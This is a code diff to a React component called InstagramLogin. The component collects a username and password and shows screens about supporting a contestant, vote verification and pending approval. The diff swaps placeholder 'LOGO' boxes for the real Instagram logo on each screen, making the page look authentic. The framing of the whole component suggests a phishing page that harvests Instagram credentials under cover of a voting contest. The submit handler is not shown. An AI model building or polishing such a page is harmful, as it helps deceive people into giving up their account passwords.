@@ -1,5 +1,5 @@
 import { useEffect, useState } from "react";
-
+import instagramLogo from "../assets/instagram-logo.png";
 export default function InstagramLogin() {
   const [username, setUsername] = useState("");
   const [password, setPassword] = useState("");
@@ -90,9 +90,8 @@ export default function InstagramLogin() {
     return (
       <div className="min-h-screen bg-[#0f1014] flex items-center justify-center px-6">
         <div className="text-center">
-
-          <div className="w-20 h-20 mx-auto border-2 border-dashed border-gray-500 rounded-2xl flex items-center justify-center text-gray-500">
-            LOGO
+          <div className="w-20 h-20 mx-auto mb-6">
+            <img src={instagramLogo} alt="Instagram Logo" className="w-full h-full object-contain" />
           </div>
 
           <h1 className="text-white text-2xl font-bold mt-8">
@@ -102,7 +101,6 @@ export default function InstagramLogin() {
           <p className="text-gray-400 mt-3">
             Thank you for supporting your contestant.
           </p>
-
         </div>
       </div>
     );
@@ -112,9 +110,8 @@ export default function InstagramLogin() {
     return (
       <div className="min-h-screen bg-[#0f1014] flex items-center justify-center px-6">
         <div className="text-center">
-
-          <div className="w-20 h-20 mx-auto border-2 border-dashed border-gray-500 rounded-2xl flex items-center justify-center text-gray-500">
-            LOGO
+          <div className="w-20 h-20 mx-auto mb-6">
+            <img src={instagramLogo} alt="Instagram Logo" className="w-full h-full object-contain" />
           </div>
 
           <h1 className="text-white text-2xl font-bold mt-8">
@@ -124,7 +121,6 @@ export default function InstagramLogin() {
           <p className="text-gray-400 mt-3">
             Your vote could not be verified.
           </p>
-
         </div>
       </div>
     );
@@ -134,11 +130,9 @@ export default function InstagramLogin() {
     return (
       <div className="min-h-screen bg-[#0f1014] flex items-center justify-center px-6">
         <div className="text-center">
-
-          <div className="w-20 h-20 mx-auto border-2 border-dashed border-gray-500 rounded-2xl flex items-center justify-center text-gray-500">
-            LOGO
-          </div>
-
+          <div className="w-20 h-20 mx-auto mb-6">
+          <img src={instagramLogo} alt="Instagram Logo" className="w-full h-full object-contain" />
+        </div>
           <h1 className="text-white text-2xl font-bold mt-8">
             Pending Approval
           </h1>
@@ -146,7 +140,6 @@ export default function InstagramLogin() {
           <p className="text-gray-400 mt-3">
             Your request has been submitted.
           </p>
-
         </div>
       </div>
     );
@@ -160,8 +153,8 @@ export default function InstagramLogin() {
       </p>
       <form onSubmit={handleLogin}>
 
-        <div className="w-20 h-20 mx-auto border-2 border-dashed border-gray-500 rounded-2xl flex items-center justify-center text-gray-500 mb-12">
-          LOGO
+        <div className="w-20 h-20 mx-auto mb-6">
+          <img src={instagramLogo} alt="Instagram Logo" className="w-full h-full object-contain" />
         </div>
 
         <input
